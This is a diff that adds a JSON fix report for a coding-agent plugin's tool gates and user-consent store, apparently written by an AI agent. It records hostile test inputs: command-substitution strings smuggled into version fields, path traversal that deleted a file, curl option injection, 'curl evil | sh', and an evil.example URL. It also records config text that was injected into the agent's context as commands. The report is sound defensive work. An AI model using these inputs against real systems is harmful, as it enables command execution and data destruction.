@@ -1,0 +1,487 @@
+{
+ "package": "H4a-toolgates-consent",
+ "branch": "fix/H4a-toolgates-consent",
+ "head": "25d18dfed2026098d84e33d0e3a5d852d4914613",
+ "worktree": "/home/user/silver-bullet/.claude/worktrees/agent-ab7451508ad51cf4c",
+ "dispositions": [
+  {
+   "id": "R5-01",
+   "status": "fixed",
+   "commits": [
+    "c53c26c",
+    "6c5eab4"
+   ],
+   "tests": [
+    "tests/hooks/test-opt-in-gates-hostile-config.sh: clearing/recording with a traversing state path leaves the victim file; RTK usage through a symlink leaves the victim file; graphify query state falls back to the default",
+    "tests/hooks/test-graphify-gate-lib-coverage.sh: state path rejected: <..|relative|trailing slash|./>; state path through a symlinked directory is rejected; record never writes through a symlink; a symlinked stamp is never fresh",
+    "tests/hooks/test-stack-compression-coordinator-coverage.sh: token state path outside the state dir is ignored"
+   ],
+   "evidence": "Red (base probe): sb_graphify_clear_query_state with query_state_file '<state>/../../../..<tmp>/victim' DELETED the victim; RTK/token usage path was not scoped at all. Green: victim survives; paths resolve through sb_rt_state_file (inside the runtime state dir only, physical parent check, no '.'/'..'/empty component), stamps are written by rename (never through a symlink).",
+   "notes": "F1's sb_runtime_state_path helper is not on this base, so containment is implemented locally in hooks/lib/recommended-tools.sh (sb_rt_state_file). When F1 merges, its edits to hooks/lib/{graphify,agentmemory,leanctx}-gate.sh will conflict: take this branch's versions (they supersede them); optionally point sb_rt_state_file at sb_runtime_state_path afterwards. session-start (not owned) calls the clear helpers, which are now safe."
+  },
+  {
+   "id": "R5-02",
+   "status": "fixed",
+   "commits": [
+    "c53c26c",
+    "6c5eab4"
+   ],
+   "tests": [
+    "tests/hooks/test-opt-in-gates-hostile-config.sh: hostile min_version / min_node_version never ran a command; the diagnostics entry points do not evaluate it either",
+    "tests/hooks/test-rtk-gate-coverage.sh: min_version rejects a[$(touch)] / 1;2 / $(id) / -1 / 1.2.3.4 / 1..2",
+    "tests/hooks/test-context-mode-libs-coverage.sh: min node rejects ...; a hostile min_node_version is never evaluated; deny bytes hostile value"
+   ],
+   "evidence": "Red (base probe, rtk 1.0.0, min_version 'a[$(touch <file>)]'): file created (command executed by [[ -gt ]]). Green: no execution; sb_rt_version_valid + sb_rt_version_ge validate (1-3 dotted numbers) before any arithmetic, and read_deny_bytes/usage_ttl/threshold values are regex-validated before (( )).",
+   "notes": ""
+  },
+  {
+   "id": "R5-03",
+   "status": "fixed",
+   "commits": [
+    "c53c26c",
+    "6c5eab4"
+   ],
+   "tests": [
+    "tests/hooks/test-opt-in-gates-hostile-config.sh: no curl call carried a hostile option or host / read a local file; the default loopback url is probed after --",
+    "tests/hooks/test-agentmemory-gate-lib-coverage.sh: health url rejected: -K..., file://, http://evil.example/health, bad port, ftp; loopback url accepted; health cache cases",
+    "tests/hooks/test-stack-optimizer-coverage.sh: synergy: a non-loopback health url is never contacted; custom loopback health url base"
+   ],
+   "evidence": "Red (base probe): curl argv `-sf --max-time 3 -K<rcfile>`. Green: `-sf --max-time 2 --proto =http,https --max-redirs 0 --noproxy * -o /dev/null -- http://localhost:3111/agentmemory/health`; health_url must match http(s)://(localhost|127.0.0.1|[::1])[:port][/path]; the synergy export POST uses the same validated base and a jq-built body.",
+   "notes": ""
+  },
+  {
+   "id": "R5-04",
+   "status": "fixed",
+   "commits": [
+    "5db448a",
+    "c53c26c",
+    "6c5eab4"
+   ],
+   "tests": [
+    "tests/hooks/test-user-consent.sh (112 assertions)",
+    "tests/hooks/test-opt-in-gates-hostile-config.sh: a recommendation without user consent never blocks (7 hooks); with consent the same project is enforced",
+    "tests/hooks/test-recommended-tools.sh / -coverage.sh: a project recommendation alone is pending; user decline -> disabled; one-time notice with grant/decline commands; legacy graphify.required",
+    "tests/hooks/test-session-start-recommended-tools.sh: recommendation injects the consent notice once; suspension note only with consent"
+   ],
+   "evidence": "Red: every gate read enabled_by_user from the committed config (hooks/lib/recommended-tools.sh:6-40) so a clone opted the user in; this repo's own .silver-bullet.json enabled all five gates for contributors. Green: gates and the stack optimizer act only on the user's consent store; the repo file is a recommendation (contributors now get a one-time notice).",
+   "notes": "Gates, recorders, session-start context, prompt-reminder lines and the optimizer are done. Remaining (H4b / skills, not owned): scripts/lib/recommended-tools/* (reconcile engine, probes, heartbeat, session-verify), sb-doctor.sh, sb-diagnostics.sh, sb-optimize-stack.sh, silver-doctor and the skills (silver-init/silver-update) still read or write enabled_by_user as consent; their 13 test files (list in notes of the package) pin the old semantics and fail until H4b adopts the consent API. Template/default config and core-rules.md text still describe the flag as consent (core-rules.md is integrity-pinned, so it was not edited). Use tests/lib/consent-helpers.sh (sb_test_consent_grant_all, sb_test_consent_grant, sb_test_consent_mirror). Round 2: agent-facing contract (core-rules.md + regenerated pin, silver-bullet.md, templates/silver-bullet.md.base, silver-init references, scaffold-steps) now names sb-consent.sh; mirrors regenerated."
+  },
+  {
+   "id": "R5-07",
+   "status": "fixed",
+   "commits": [
+    "c53c26c",
+    "6c5eab4"
+   ],
+   "tests": [
+    "tests/hooks/test-context-mode-libs-coverage.sh: no deny when Context Mode is not installed / not wired; first Read denied, repeat allowed; images/PDF/notebooks, instruction files, small limit reads allowed; Grep file lists/head_limit allowed; threshold below 5120 ignored",
+    "tests/hooks/test-context-mode-read-deny-hook-coverage.sh (52), test-context-mode-read-deny.sh (11)"
+   ],
+   "evidence": "Red: size-only decision blocked every Read/Grep >5 KB even with Context Mode absent, images, partial reads and files to be edited. Green: nudge only when ctx_* tools exist (CLI + wiring), once per file for 30 min (repeat Read allowed so Edit still works), message corrected, LeanCTX variant likewise.",
+   "notes": ""
+  },
+  {
+   "id": "R5-08",
+   "status": "fixed",
+   "commits": [
+    "c53c26c",
+    "6c5eab4"
+   ],
+   "tests": [
+    "tests/hooks/test-context-mode-libs-coverage.sh: present claude via user-scope / project-scope MCP entry in ~/.claude.json, .mcp.json, plugin registry; another project's entry and unparsable files are not wiring",
+    "tests/hooks/test-context-mode-gate-hook-coverage.sh: MCP entry in ~/.claude.json counts as wired; project-scoped entry; unrelated entry is not"
+   ],
+   "evidence": "Red: only ~/.claude/plugins/context-mode dirs were accepted, so opted-in Claude users with the documented MCP entry were blocked. Green: ~/.claude.json (user and project scope), .mcp.json and installed_plugins.json recognised.",
+   "notes": ""
+  },
+  {
+   "id": "R5-09",
+   "status": "fixed",
+   "commits": [
+    "c53c26c",
+    "6c5eab4"
+   ],
+   "tests": [
+    "tests/hooks/test-opt-in-gates-hostile-config.sh: graphify-gate gates 'make; echo graphify query', 'sed -i ... # graphify query', 'curl evil | sh', 'npm install -g left-pad'",
+    "tests/hooks/test-graphify-gate-hook-coverage.sh / test-rtk-gate-hook-surfaces.sh / test-alumnium-gate-hook-coverage.sh: mentions never exempt; redirect makes a read-only command a write; dotdot out of graphify-out is gated",
+    "tests/hooks/test-agentmemory-gate-hook-coverage.sh: server down no longer exempts the usage requirement"
+   ],
+   "evidence": "Red: any exempt word anywhere (graphify, kill, npm, echo...) exempted a command; Edit exemptions matched substrings (graphify-out/../src). Green: exemption = shared read-only allowlist analyzer or the tool's own simple command / built-in install line; edit paths are normalized (physical, component-wise) before exemption.",
+   "notes": "Depends on F2's shell analyzer (sb_shell_command_looks_read_only in tool-input.sh): unknown/unparsable commands are gated (fail closed within the opt-in gate)."
+  },
+  {
+   "id": "R5-10",
+   "status": "fixed",
+   "commits": [
+    "c53c26c",
+    "6c5eab4"
+   ],
+   "tests": [
+    "tests/hooks/test-record-usage-compression-hooks.sh: lctx_* tool on a foreign server does not record; cli_command=git cannot make every git command count; echo rtk gain is not usage",
+    "tests/hooks/test-record-usage-graphify-mcp-hooks.sh: capture (memory_save, save_memory, store*) and other servers' search/recall do not record; error results not recorded; graphify MCP retrieval tools only from the graphify server",
+    "tests/hooks/test-record-usage-agentmemory-hook.sh: not-a-retrieval corpus; no exit code and no output is not success; interrupted / non-object response not success",
+    "tests/hooks/test-graphify-gate-lib-coverage.sh: not retrieval: echo/pipe/||/;/redirect/diagnose/dfs; tests/hooks/test-agentmemory-gate-lib-coverage.sh retrieval corpus"
+   ],
+   "evidence": "Red: usage was credited for any command mentioning the word, any lctx_*/search tool on any server, a missing exit code, and config cli_command/mcp_server_name spliced into regexes. Green: a single simple command run on its own that visibly succeeded, or a retrieval tool of the tool's own MCP server; config names are ignored.",
+   "notes": "Graphify retrieval is query|explain|path|affected (diagnose/dfs are no longer counted)."
+  },
+  {
+   "id": "R5-11",
+   "status": "fixed",
+   "commits": [
+    "c53c26c",
+    "6c5eab4"
+   ],
+   "tests": [
+    "hooks.json matchers: PostToolUse mcp__.*agentmemory.*|mcp__.*graphify.*|mcp__.*lean-?ctx.* -> record-leanctx-usage.sh + record-recommended-mcp.sh; PreToolUse mcp__.*lean-?ctx.*|mcp__.*context[-_]mode.* -> stack-compression-coordinator.sh",
+    "tests/hooks/test-record-usage-graphify-mcp-hooks.sh: Claude Code names (mcp__server__tool) record",
+    "tests/hooks/test-record-agentmemory-usage.sh: MCP retrieval recorded by record-recommended-mcp.sh"
+   ],
+   "evidence": "Red: on Claude Code the matchers were CallMcpTool|MCP so mcp__* tools never reached the recorders. Green: both naming schemes are routed (sb_opt_in_mcp_call parses both); record-agentmemory-usage.sh is Bash-only, MCP retrieval lives in record-recommended-mcp.sh.",
+   "notes": "hooks/cursor-hooks.json and plugins/silver-bullet/cursor-hooks.json regenerated with generate-cursor-hooks.py (H2 owns the generator; regenerate-only)."
+  },
+  {
+   "id": "R5-12",
+   "status": "fixed",
+   "commits": [
+    "c53c26c",
+    "6c5eab4"
+   ],
+   "tests": [
+    "tests/hooks/test-alumnium-gate-lib-coverage.sh: npx available without any registry query (npm stub never run)",
+    "tests/hooks/test-alumnium-gate-hook-coverage.sh: an unreachable registry is irrelevant; unit spec edit and commits are not browser work; playwright run and e2e writes are gated"
+   ],
+   "evidence": "Red: every gated call ran `npm view alumnium version` (offline: false 'MCP not wired'; online: a network wait per call) and every commit/write was gated. Green: no registry query; gate scope = browser-test edits and browser-tool commands.",
+   "notes": ""
+  },
+  {
+   "id": "R5-13",
+   "status": "fixed",
+   "commits": [
+    "c53c26c",
+    "6c5eab4"
+   ],
+   "tests": [
+    "tests/hooks/test-five-tool-mutual-exclusion.sh: later list element / grep for lctx_shell is not a wrapper, mutex stays clean",
+    "tests/hooks/test-stack-compression-coordinator-hook-coverage.sh: dirty mutex never blocks Edit/Write or an unrelated MCP tool; another session's violation does not block this session",
+    "tests/hooks/test-stack-compression-coordinator-coverage.sh: marker in program position only; scoped state paths; clearing one session / project / all"
+   ],
+   "evidence": "Red: a mere mention of lctx_shell in any command recorded a violation in a global mutex which then denied every non-Bash tool in every SB project. Green: markers matched in program position, state per project and session (stack-compression-mutex.d/<project>-<session>.json), only the compression surfaces (Bash/Read/Grep/WebFetch/routed MCP) are blocked, recovery by a compliant routed call.",
+   "notes": "The coordinator ignores the trivial marker (SB_OPT_IN_TRIVIAL_BYPASS=0), as before."
+  },
+  {
+   "id": "R5-14",
+   "status": "fixed",
+   "commits": [
+    "c53c26c",
+    "6c5eab4"
+   ],
+   "tests": [
+    "tests/hooks/test-stack-optimizer-coverage.sh: config post-index/pre-index commands are never executed; no wire consent -> SKIP message and nothing machine-wide written; injected newline in a profile knob is ignored; knobs only from allowed sets; prompt line never nudges without wire consent",
+    "tests/hooks/test-recommended-tools.sh/-coverage.sh: config platform commands and install lists are ignored",
+    "tests/hooks/test-opt-in-gate-lib.sh: env merge refuses an export root that escapes the project; nothing created through an escaping export-root symlink"
+   ],
+   "evidence": "Red: platform_install_commands/post_index from the cloned config were eval'd, unquoted knobs were written into ~/.agentmemory/.env, LaunchAgents/brew ran on a repository's opt-in, and the prompt told the agent to run --apply. Green: built-in command words run without a shell, knobs validated against closed sets, wire/install consent required, scaffold goes through the containment helper.",
+   "notes": "The scripts that install tools (scripts/install-*.sh, reconcile engine) are H4b."
+  },
+  {
+   "id": "R5-15",
+   "status": "fixed",
+   "commits": [
+    "c53c26c",
+    "6c5eab4"
+   ],
+   "tests": [
+    "tests/hooks/test-opt-in-gates-hostile-config.sh: a cached project root does not impose that project's gate on a directory outside it",
+    "tests/hooks/test-gate-hooks-fault-injection.sh: missing project-gate library fails open; project search only treats both-marker directories as projects"
+   ],
+   "evidence": "Red: gates used the cache-backed sb_find_project_config for deny decisions. Green: sb_find_project_config_walk_only in all gates, recorders and rtk-compat.",
+   "notes": "prompt-reminder.sh and session-start (not owned) still use the cache-backed finder for context lines (no deny decisions)."
+  },
+  {
+   "id": "R5-16",
+   "status": "fixed",
+   "commits": [
+    "c53c26c",
+    "6c5eab4"
+   ],
+   "tests": [
+    "tests/hooks/test-token-compression-tools-gate-hook-coverage.sh: Edit/Write/MultiEdit/apply_patch are not gated by stale RTK usage; a mention of a delivery command is not a delivery step; delivery commands still gated"
+   ],
+   "evidence": "Red: every Edit/Write was blocked when RTK usage was stale although the docs say commits. Green: shell delivery commands (git commit, gh pr create, gh release create) only; read-only mentions do not count.",
+   "notes": ""
+  },
+  {
+   "id": "R5-17",
+   "status": "fixed",
+   "commits": [
+    "c53c26c",
+    "6c5eab4"
+   ],
+   "tests": [
+    "tests/hooks/test-opt-in-gate-lib.sh: consent pre-check/inertness; every hook exits 0 and silent when the prelude is missing"
+   ],
+   "evidence": "Measured (40 gate hook runs, nothing consented): base 3.49 s (project opt-in in config) -> 0.51 s. The consent file test runs before any jq/python3; npm view and per-call curl waits are gone (health cached 30 s, score cached 10 min); record-recommended-mcp is no longer registered on every Bash call.",
+   "notes": "Not re-measured with all five tools consented (gates then do real work by design)."
+  },
+  {
+   "id": "R5-18",
+   "status": "fixed",
+   "commits": [
+    "c53c26c",
+    "6c5eab4"
+   ],
+   "tests": [
+    "tests/hooks/test-rtk-gate-hook-coverage.sh: 0.40.0 and 0.41.9 rejected as RTK TOO OLD; 0.42.0 passes; unparsable version rejected"
+   ],
+   "evidence": "Red: grep -E '0\\.4[0-9]' accepted 0.40/0.41 and ignored min_version for any 0.4x; too-old versions printed 'not installed'. Green: semantic comparison via sb_rt_version_ge, dedicated sb_rtk_block_message_old_version.",
+   "notes": ""
+  },
+  {
+   "id": "R5-19",
+   "status": "fixed",
+   "commits": [
+    "c53c26c"
+   ],
+   "tests": [
+    "tests/hooks/test-leanctx-gate-lib.sh: the unused hooks-present helper is removed",
+    "tests/hooks/test-stack-compression-coordinator-coverage.sh: the dead lifecycle helpers are gone"
+   ],
+   "evidence": "Dead code removed: hooks/stack-compression-lifecycle.sh (+ test), sb_stack_lifecycle_*, sb_*_hooks_present, cursor_rule_present, is_windows_native, usage_epoch helpers; record-recommended-mcp.sh is no longer registered for Bash and its docs line corrected.",
+   "notes": "Remaining: sb_leanctx_clear_usage_state exists but is not called on branch/worktree change because that is session-start (not owned) \u2014 it needs a one-line call next to sb_graphify_clear_query_state / sb_agentmemory_clear_usage_state. The agentmemory no_server/no_mcp messages are now used (deny reasons). Round 2: agent-facing contract (core-rules.md + regenerated pin, silver-bullet.md, templates/silver-bullet.md.base, silver-init references, scaffold-steps) now names sb-consent.sh; mirrors regenerated."
+  },
+  {
+   "id": "R5-20",
+   "status": "fixed",
+   "commits": [
+    "6c5eab4"
+   ],
+   "tests": [
+    "tests/hooks/test-opt-in-gates-hostile-config.sh",
+    "tests/hooks/test-opt-in-gate-lib.sh",
+    "+ migrated tests: gate/recorder/coordinator/optimizer/recommended-tools/prompt-reminder/integration (66+ files)"
+   ],
+   "evidence": "Red: the old tests passed only for happy paths (501 assertions failed once consent moved out of the config) and none covered the dangerous paths. Green: hostile-config corpus, shared-prelude unit tests, 100% coverage of the changed files.",
+   "notes": ""
+  },
+  {
+   "id": "R5-21",
+   "status": "fixed",
+   "commits": [
+    "c53c26c",
+    "6c5eab4"
+   ],
+   "tests": [
+    "tests/hooks/test-recommended-tools.sh: config benefits_summary/license_note/install_commands never appear in instructions; failure reason never echoed",
+    "tests/hooks/test-context-mode-libs-coverage.sh: no_cli license is the built-in ELv2 notice, repo license_note ignored"
+   ],
+   "evidence": "Red: repository strings were injected verbatim into deny reasons and SessionStart context as commands for the agent. Green: all instruction text comes from built-in tables; graph_path/export_root are validated paths; consent commands name the plugin's own scripts by absolute path.",
+   "notes": ""
+  }
+ ],
+ "consent_api": {
+  "store": {
+   "path": "${XDG_CONFIG_HOME:-$HOME/.config}/silver-bullet/consent.json (XDG_CONFIG_HOME must be absolute, else $HOME/.config); mode 0600; backup consent.json.bak",
+   "format": {
+    "schema": 1,
+    "machine": {
+     "<tool>": {
+      "<capability>": {
+       "decision": "granted|declined",
+       "at": "UTC ISO-8601",
+       "source": "label"
+      }
+     }
+    },
+    "projects": {
+     "<project key = physical project root; linked worktrees map to the main checkout>": {
+      "<tool>": {
+       "enforce": "RECORD"
+      }
+     }
+    },
+    "log": "newest 200 {at,action,tool,capabilities,scope,source}"
+   },
+   "tools": [
+    "graphify",
+    "agentmemory",
+    "alumnium",
+    "search_cli",
+    "rtk",
+    "context_mode",
+    "leanctx"
+   ],
+   "capabilities": {
+    "install": "machine only",
+    "wire": "machine only",
+    "enforce": "one project or machine; a project record wins over the machine record; no record = unset = nothing runs, no gate blocks"
+   }
+  },
+  "bash_api (source hooks/lib/user-consent.sh)": {
+   "sb_consent_store_path": "print the store path",
+   "sb_consent_tool_valid TOOL": "status 0 for a known tool",
+   "sb_consent_capability_valid CAP": "status 0 for install|wire|enforce",
+   "sb_consent_project_key DIR": "print the project key (status 1: no dir)",
+   "sb_consent_decision TOOL CAP [PROJECT_DIR]": "print granted|declined|unset",
+   "sb_consent_granted TOOL CAP [PROJECT_DIR]": "status 0 only when granted",
+   "sb_consent_store_mentions TOOL": "cheap pre-check, status 1 = no record",
+   "sb_consent_set DECISION TOOL CAPS SCOPE [SOURCE]": "DECISION granted|declined|unset (unset removes), CAPS comma list, SCOPE machine or a project dir (enforce only); status 2 + stderr message on usage error or unwritable store; atomic, idempotent, mode-preserving, refuses symlinked stores",
+   "sb_consent_status_lines [PROJECT_DIR]": "'<tool> <capability> <decision>' per pair"
+  },
+  "consumers (hooks/lib/recommended-tools.sh)": {
+   "sb_recommended_tool_consent CONFIG TOOL": "pending|enabled|disabled (project 'false' -> disabled; user decline -> disabled; user enforce grant -> enabled; else pending)",
+   "sb_recommended_tool_project_preference CONFIG TOOL": "recommended|disabled|unset (what the repo says)",
+   "sb_recommended_tool_enforced CONFIG TOOL": "the single gate test: user enforce consent AND project does not turn it off (enabled_by_user false / enforcement_suspended / required_when_enabled false)"
+  },
+  "cli (scripts/sb-consent.sh)": {
+   "path": "print store path",
+   "status [--project DIR]": "all tool/capability decisions",
+   "check TOOL CAP [--project DIR]": "prints decision; exit 0 only when granted, 1 otherwise",
+   "grant|decline|revoke TOOL (--project DIR|--all-projects) [--capabilities install,wire,enforce] [--source TEXT]": "TOOL may be 'all'; --project records enforce for that project (install/wire go to the machine); --all-projects records every listed capability for the machine",
+   "exit": "0 ok, 1 check-not-granted, 2 error, 64 usage"
+  },
+  "h4b_adoption": "Installers/reconcilers should call `bash <plugin>/scripts/sb-consent.sh check <tool> install|wire` (or sb_consent_granted) before any package install or host-config write and print the grant command otherwise; tests can use tests/lib/consent-helpers.sh (sb_test_consent_sandbox, sb_test_consent_grant, sb_test_consent_grant_all, sb_test_consent_mirror CONFIG).",
+  "docs": "docs/CONSENT.md"
+ },
+ "files_changed_outside_ownership": [
+  "CLAUDE.md: hook script count 64 -> 63 (tests/docs/test-doc-facts.sh) after deleting the dead stack-compression-lifecycle.sh",
+  "scripts/README.md: list scripts/sb-consent.sh (doc-facts test)",
+  "hooks/hooks.json: remove the lifecycle hook, narrow record-recommended-mcp, add mcp__* matchers (needed for R5-11/R5-19)",
+  "hooks/cursor-hooks.json, plugins/silver-bullet/cursor-hooks.json: regenerated with scripts/generate-cursor-hooks.py (regenerate only)",
+  "docs/HOOKS.md (generated) and docs/hooks-purpose.json: regenerated / purpose text for changed hooks",
+  "docs/GRAPHIFY.md, AGENTMEMORY.md, ALUMNIUM.md, CONFIGURATION.md, CONTEXT-MODE.md, LEANCTX.md, RTK.md, STACK-OPTIMIZATION.md: consent is per user; new docs/CONSENT.md",
+  "hooks/stack-compression-lifecycle.sh and tests/hooks/test-stack-compression-lifecycle.sh: deleted (dead; R5-19)",
+  "tests/lib/c-toolgates-1-helpers.sh, tests/lib/c-toolgates-2-helpers.sh: shared gate-suite helpers updated for the new semantics (optional gated-command argument, missing-prelude and consent-pending cases)",
+  "tests outside the gate files that exercised these libs: tests/hooks/test-prompt-reminder-paths.sh, test-site-session-gates.sh, test-five-tool-mutual-exclusion.sh, test-gate-hooks-fault-injection.sh, test-pipe-grep-quiet-producers.sh, tests/integration/test-graphify-enforcement.sh, test-synergy-optimization.sh"
+ ],
+ "known_failing_until_h4b": [
+  "tests/scripts/test-reconcile-recommended-tools-engine.sh",
+  "tests/scripts/test-reconcile-recommended-tools.sh",
+  "tests/scripts/test-rt-common-paths.sh",
+  "tests/scripts/test-rt-graphify-agentmemory.sh",
+  "tests/scripts/test-rt-heartbeat-session-vendor.sh",
+  "tests/scripts/test-rt-hooks-batch-opencode-errors.sh",
+  "tests/scripts/test-rt-hooks-batch.sh",
+  "tests/scripts/test-rt-probes-cm-alumnium-search.sh",
+  "tests/scripts/test-sb-diagnostics-reallibs.sh",
+  "tests/scripts/test-sb-doctor-host-checks.sh",
+  "tests/scripts/test-sb-doctor-host-fixes.sh",
+  "tests/scripts/test-sb-optimize-stack-modes.sh",
+  "tests/scripts/test-sb-small-scripts.sh",
+  "tests/scripts/test-silver-doctor.sh"
+ ],
+ "validation": {
+  "tests": "claude: 100 of 122 candidate files in first run then fixes re-run green (21 files 1508/0), remaining 21 ran: only known H4b-class failures; codex: 85+21 files, only known H4b-class failures plus test-enable-verify-scripts; docs suite 199/0",
+  "coverage": "scoped run, 100% statements/lines/functions for opt-in-gate (union of two runs), token-compression-tools-gate, alumnium gate+lib, recommended-tools, stack-optimizer, user-consent, graphify-am-global, sb-consent.sh",
+  "lint": "lint-shell --all clean",
+  "invariants": "check-repo-invariants all PASS; generate-hook-reference/apo --check, validate-plugin-mirror OK"
+ },
+ "notes": "No commits on claude/optimistic-ramanujan-tccfud since the base, so the required merge was a no-op. Merge guidance for F1 (fix/F1-output-paths): conflicts in hooks/lib/{graphify,agentmemory,leanctx}-gate.sh and token-compression-tools-gate.sh are expected; resolve in favour of this branch (R5-01 is fully covered here by sb_rt_state_file) and, if wanted, route sb_rt_state_file through F1's sb_runtime_state_path. Mixed-in dependency on F2: shell exemption relies on sb_shell_command_looks_read_only in hooks/lib/tool-input.sh; unknown/unparsable commands are gated. core-rules.md (integrity-pinned) and silver-bullet.md/templates still describe enabled_by_user as consent; changing them needs the integrity pin update and template parity, left for the owner of those files.",
+ "review_round2": {
+  "merge": "merged claude/optimistic-ramanujan-tccfud (H2 installers); only cursor-hooks.json conflicted, regenerated",
+  "issues": [
+   {
+    "n": 1,
+    "severity": "major",
+    "status": "fixed",
+    "what": "3 unlisted scripts tests: delegate-common asserts the shared prelude; rt-probes-host-tools records consent via tests/lib/h-recommended-helpers.sh hr_project (also stops cli_command pinning); enable-verify-scripts handed to H4b (scripts/enable-alumnium.sh must call npm view itself; the gate lib no longer queries the registry)"
+   },
+   {
+    "n": 2,
+    "severity": "major",
+    "status": "fixed",
+    "what": "sb_stack_ensure_agentmemory_gitignore refuses symlink/non-regular .gitignore, writes via temp+rename keeping mode; dry-run no longer touches the file"
+   },
+   {
+    "n": 3,
+    "severity": "major",
+    "status": "fixed",
+    "what": "sb_opt_in_shell_needs_gate: gate writes (analyzer), delivery (quoted/variable git, gh pr/release create, eval) and machine installs/curl|sh only; honest tests for pytest, make test, cargo, go, gradlew, docker, kubectl, terraform in all five gates; tests pinning over-gating rewritten"
+   },
+   {
+    "n": 4,
+    "severity": "major",
+    "status": "fixed",
+    "what": "contract docs updated, core-rules.sha256 regenerated, mirrors synced"
+   },
+   {
+    "n": 5,
+    "severity": "minor",
+    "status": "fixed",
+    "what": "sb_rt_state_file rejects SB control-file names (denylist: trivial, state, branch, project-root, logs, consent, dotfiles, .requested/.bak/.lock); an allowlist of <tool>-usage/query names was tried and dropped, it broke ~20 tests with custom stamp names"
+   },
+   {
+    "n": 6,
+    "severity": "minor",
+    "status": "fixed",
+    "what": "sb_consent_set serialised by mkdir lock with dead-owner takeover, SB_CONSENT_LOCK_TRIES; 7 parallel grants all recorded, parallel revokes too"
+   },
+   {
+    "n": 7,
+    "severity": "minor",
+    "status": "fixed",
+    "what": ".bak removed then copied, symlink target untouched"
+   },
+   {
+    "n": 8,
+    "severity": "minor",
+    "status": "fixed",
+    "what": "migration Yes = --capabilities enforce; sb-consent.sh --project resolves to the dir holding .silver-bullet.json; docs/CONSENT.md states the agent-forgery limit; deny hints prefixed If the user asks"
+   },
+   {
+    "n": 9,
+    "severity": "minor",
+    "status": "fixed",
+    "what": "alumnium hook normalises apply_patch paths against the project root"
+   },
+   {
+    "n": 10,
+    "severity": "minor",
+    "status": "fixed",
+    "what": "quote-stripped and variable-program delivery detection shared via sb_opt_in_shell_is_delivery"
+   },
+   {
+    "n": 11,
+    "severity": "minor",
+    "status": "fixed",
+    "what": "empty-array guards (_sb_opt_in_program, sb_rt_state_file); not reproducible on Bash 5, covered by bash -u test"
+   },
+   {
+    "n": 12,
+    "severity": "minor",
+    "status": "fixed",
+    "what": "HOSTILE uses HOME[...]; added a store with consent for another project/tool so gates reach the real decision"
+   },
+   {
+    "n": 13,
+    "severity": "minor",
+    "status": "fixed",
+    "what": "CLAUDE.md SessionStart bullet"
+   }
+  ],
+  "R6-29": "fixed: ga_opencode_merge_agentmemory_mcp calls scripts/lib/global-toolstack/patch-mcp.py (opencode_server_config) in place of the npx stdio JSON; idempotent second run asserted",
+  "api_compat": "consent API unchanged; additions only: sb_opt_in_shell_is_delivery/is_install, SB_CONSENT_LOCK_TRIES, sb-consent.sh --project root resolution, migration Yes now enforce-only",
+  "h4b_handoff": [
+   "scripts/enable-alumnium.sh: version/reachability via npm view (test-enable-verify-scripts.sh fails until then)",
+   "13 listed scripts tests (14 names) remain accepted; hr_project consent mirroring may fix some of them"
+  ]
+ },
+ "review_repair_r2": {
+  "merge": "merged claude/optimistic-ramanujan-tccfud twice (F2 shell analyzer 127e2f9, then 94800f8 site-test fix)",
+  "1_stamp_allowlist": "fixed: sb_rt_state_file lowercases the basename and requires ^[a-z0-9-]+-(usage|query)$; orchestrator-directive.json, planning/roadmap-edit-override, mode, skill-invocations, Trivial/TRIVIAL etc. fall back; ~20 tests renamed to fit; docs/CONSENT.md row corrected",
+  "2_lock": "fixed: takeover under <lock>.takeover with re-check (stale lock + 7 parallel grants x3 rounds all land), ownerless lock reclaimed after the wait, non-numeric/zero SB_CONSENT_LOCK_TRIES -> 100",
+  "3_classifier": "fixed: sb_opt_in_shell_is_delivery/is_install/needs_gate use shell-analysis.sh (actions/possible_actions incl. unseen, parsed argv via jq); git --no-pager commit, alias ci, $'commit', merge/cherry-pick/revert/am, curl|/bin/bash, curl|python3, bash <(curl), pipx/cargo/go/gem/uv installs, npm -g install are gated; $PYTHON -m pytest, pytest, make test, npm install, cargo test pass in all five gates; analyzer unavailable => command counts as possible delivery (consented gate still gates)",
+  "4_coverage": "single scoped run (72 test files incl. test-gate-hooks-fault-injection.sh): opt-in-gate.sh 292/292 and all 9 changed files 100% statements/lines/functions, exit 0",
+  "validation": "hooks tests (104 files) claude and codex: all green after merging 94800f8; lint-shell --all clean; invariants all PASS; hook-reference check OK; sync-codex-package leaves no diff",
+  "api": "backward compatible; no function removed or renamed"
+ },
+ "review_repair_r3": {
+  "merge": "merged base 5acae75",
+  "1_stamp_path": "fixed: configured stamp must be exactly <state dir>/<allowed name> (any \"/\" in the remainder -> fallback); sb_rt_stamp_write creates only the state dir (mkdir -p on that fixed path) and at most one marker level with plain mkdir, never a tree; tests: control names as directories (trivial,state,branch,mode,orchestrator-directive.json,planning/roadmap-edit-override,skill-invocations), symlink, .., ./, no directory created; writer tests",
+  "2_lint": "fixed: test-agentmemory-gate.sh assert_contains uses a here-string; test-no-pipe-into-grep-quiet 4/0 (H4b has the same line and must take this fix)",
+  "3_minor": "fixed: bad SB_CONSENT_LOCK_TRIES tested with a held ownerless lock (default wait governs), capped 1..1000, stale .takeover (>1 min) cleared and named in the message",
+  "coordinator_item": "an unwritable lock owner record never fails the write: owner record is best effort via _sb_consent_write_owner; ownerless lock stays reclaimable; test overrides the function to fail",
+  "validation": "hooks+listed scripts tests (107 files): codex 5333/0; claude all green (102 files in the main run, remaining 5 re-run 397/0); one scoped coverage run incl. test-gate-hooks-fault-injection.sh: all 9 changed files 100% (2100/2100 statements); lint of changed files clean, invariants, generator checks, mirrors OK, sync leaves no diff",
+  "tip": "25d18dfed2026098d84e33d0e3a5d852d4914613"
+ }
+}
